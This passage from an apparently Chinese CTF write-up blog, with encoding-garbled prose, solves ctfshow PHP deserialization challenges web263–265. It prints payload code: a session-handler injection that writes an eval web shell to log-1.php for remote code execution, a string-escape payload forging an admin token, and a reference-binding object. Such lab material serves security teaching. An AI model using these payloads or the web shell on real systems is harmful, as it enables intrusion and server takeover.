class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&quot;Asia/Shanghai&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">use</span> \<span class="title">CTFSHOW</span>\<span class="title">CTFSHOW</span>; </span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;CTFSHOW.php&#x27;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CTFSHOW</span>([</span><br><span class="line">    <span class="string">&#x27;database_type&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;database_name&#x27;</span> =&gt; <span class="string">&#x27;web&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;charset&#x27;</span> =&gt; <span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;port&#x27;</span> =&gt; <span class="number">3306</span>,</span><br><span class="line">    <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;option&#x27;</span> =&gt; [</span><br><span class="line">        PDO::<span class="variable constant_">ATTR_CASE</span> =&gt; PDO::<span class="variable constant_">CASE_NATURAL</span></span><br><span class="line">    ]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sqlæ³¨å…¥æ£€æŸ¥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\ï¼ˆ|\ï¼‰|\+|\=|\[|\]|\;|\:|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\?/i&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable">$this</span>-&gt;username, <span class="string">&quot;ä½¿ç”¨&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;ç™»é™†&quot;</span>.(<span class="variable">$this</span>-&gt;status?<span class="string">&quot;æˆåŠŸ&quot;</span>:<span class="string">&quot;å¤±è´¥&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*ç”Ÿæˆå”¯ä¸€æ ‡å¿—</span></span><br><span class="line"><span class="comment">*æ ‡å‡†çš„UUIDæ ¼å¼ä¸ºï¼šxxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">uuid</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$chars</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));  </span><br><span class="line">    <span class="variable">$uuid</span> = <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">0</span>, <span class="number">8</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">8</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span> </span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">12</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">16</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">20</span>, <span class="number">12</span> );  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$uuid</span> ;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>â€‹æœ€åä¸€ä¸ªæ–‡ä»¶æ²¡å•¥ç”¨ï¼Œåˆé•¿ï¼Œå°±ä¸æ”¾äº†ã€‚</p><p>â€‹å…ˆçœ‹ inc/inc.phpï¼Œé‡Œé¢å­˜åœ¨ <code>ini_set('session.serialize_handler', 'php');</code> ï¼Œæ ¹æ® user ç±»ï¼Œå‘ç°å¯ä»¥å†™å…¥æ–‡ä»¶ï¼Œå‘ç°åœ¨é­”æœ¯æ–¹æ³•__destruct ä¸­ä¼šæŠŠ password å†™å…¥ log-username æ–‡ä»¶ä¸­ï¼Œè€Œè¿™é‡Œçš„ username å’Œ password å¯æ§ï¼Œåœ¨ index.php ä¸­ä¼šæ£€æŸ¥æ˜¯å¦è®¾ç½®äº† sessionï¼Œå¹¶ä¸”ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable">$this</span>-&gt;username, <span class="string">&quot;ä½¿ç”¨&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;ç™»é™†&quot;</span>.(<span class="variable">$this</span>-&gt;status?<span class="string">&quot;æˆåŠŸ&quot;</span>:<span class="string">&quot;å¤±è´¥&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>â€‹å› ä¸º session.save_handler=&quot;&quot; äº user.ini é»˜è®¤è®¾ç½®ä¸ç¬¦ï¼Œä¼šååºåˆ—åŒ– session ä¸­ | åçš„æ•°æ®æ‰€ä»¥å¯ä»¥ç›´æ¥æ„é€  payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">#palyoad:fE86NDoiVXNlciI6Mjp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyNDoiPD9waHAgZXZhbCgkX1BPU1RbYV0pOz8%2BIjt9</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åè®¿é—® index.phpï¼Œå°† cookie çš„ limit å‚æ•°æ”¹ä¸ºç”Ÿæˆçš„ base64 ç¼–ç å­—ç¬¦ä¸²ï¼Œç„¶åè®¿é—® check.phpï¼Œæœ€åè®¿é—® log-1.php å³å¯è¿›è¡Œ rceã€‚</p><h1 id="web264"><a class="markdownIt-Anchor" href="#web264">#</a> web264ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>â€‹å’Œ 262 ä¸€æ ·ï¼Œè®¿é—® message.phpï¼Œç„¶åä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œä¼¼ä¹ä¸èƒ½ä¿®æ”¹ cookie äº†ï¼Œæ²¡åŠæ³•äº†ï¼Œç›´æ¥æ‰“å§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$msg_1</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$msg_1</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#f=a&amp;m=b&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹index.php ç”¨ get ä¼ å‚ payloadï¼Œä¹‹åè®¿é—® message.phpï¼Œcookie åé¢åŠ ä¸€ä¸ªï¼›msg=1 å³å¯ã€‚</p><h1 id="web265"><a class="markdownIt-Anchor" href="#web265">#</a> web265ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>php çš„ç‰¹æ€§ï¼ŒæŒ‰åœ°å€ä¼ å‚</p><p>ä¾‹å¦‚ $a = 1  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo>=</mo><mn>2</mn><mo separator="true">,</mo><mtext>è¿™æ—¶è®©</mtext></mrow><annotation encoding="application/x-tex">b = 2, è¿™æ—¶è®©</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">è¿™</span><span class="mord cjk_fallback">æ—¶</span><span class="mord cjk_fallback">è®©</span></span></span></span> b = &amp;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mtext>å†ç»™</mtext></mrow><annotation encoding="application/x-tex">a, å†ç»™</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">å†</span><span class="mord cjk_fallback">ç»™</span></span></span></span> a é‡æ–°èµ‹ä¸ªå€¼ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>=</mo><mn>3</mn><mo separator="true">,</mo><mtext>è¿™ä¸ªæ—¶å€™</mtext></mrow><annotation encoding="application/x-tex">a = 3, è¿™ä¸ªæ—¶å€™</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">è¿™</span><span class="mord cjk_fallback">ä¸ª</span><span class="mord cjk_fallback">æ—¶</span><span class="mord cjk_fallback">å€™</span></span></span></span> b å°±ä¼šä¸€ç›´è·Ÿç€ $a å˜åŒ–ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mtext>æ˜¯ä»€ä¹ˆ</mtext></mrow><annotation encoding="application/x-tex">aæ˜¯ä»€ä¹ˆ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord cjk_fallback">æ˜¯</span><span class="mord cjk_fallback">ä»€</span><span class="mord cjk_fallback">ä¹ˆ</span></span></span></span> b å°±æ˜¯ä»€ä¹ˆ</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=&amp;<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªå°±ä¼šå‘ç°ï¼Œa çš„å€¼ä¼šè·Ÿç€ b ä¸€èµ·æ”¹å˜ã€‚æ‰€ä»¥ payload å¯ä»¥å¦‚ä¸‹ç”Ÿæˆï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password =&amp; <span class="variable language_">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 